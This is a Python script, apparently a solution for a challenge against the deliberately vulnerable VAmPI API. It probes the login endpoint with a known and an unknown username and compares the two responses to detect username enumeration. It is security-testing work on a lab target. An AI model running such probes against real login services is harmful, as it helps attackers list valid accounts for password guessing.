#!/usr/bin/env python3
"""
vampi_challenge_07_user_enumeration.py — User / credential enumeration.

VAmPI's login returns DIFFERENT bodies for an unknown username vs. a known
username with a wrong password. By comparing the two responses we can tell
which usernames exist — the user-enumeration pattern.

Read-only (failed logins only); safe to re-run.
Run: python3 vampi_challenge_07_user_enumeration.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def probe(base, username, password, tout, idx):
    r = requests.post(f"{base}/users/v1/login",
                      json={"username": username, "password": password},
                      headers={**vc.consumer_headers(idx), "Content-Type": "application/json"}, timeout=tout)
    try:
        d = r.json()
    except Exception:
        d = {}
    return r.status_code, d.get("message") or d.get("status") or ""


def main():
    ap = argparse.ArgumentParser(description="User enumeration via login responses")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)
    known = vc.known_users(cfg)[0]["username"]

    wrong = "wrongpassword"
    code_known, msg_known = probe(base, known, wrong, tout, 807)
    code_unknown, msg_unknown = probe(base, "definitely-not-a-user-xyz", wrong, tout, 807)

    print(f"known username   '{known:20}' -> HTTP {code_known} | {msg_known!r}")
    print(f"unknown username 'definitely-not-a-user-xyz' -> HTTP {code_unknown} | {msg_unknown!r}")

    if (code_known, msg_known) != (code_unknown, msg_unknown):
        print("[FINDING] login responses differ for known vs unknown users -> username enumeration.")
    else:
        print("[ok] identical responses for known vs unknown users (no enumeration signal).")


if __name__ == "__main__":
    main()
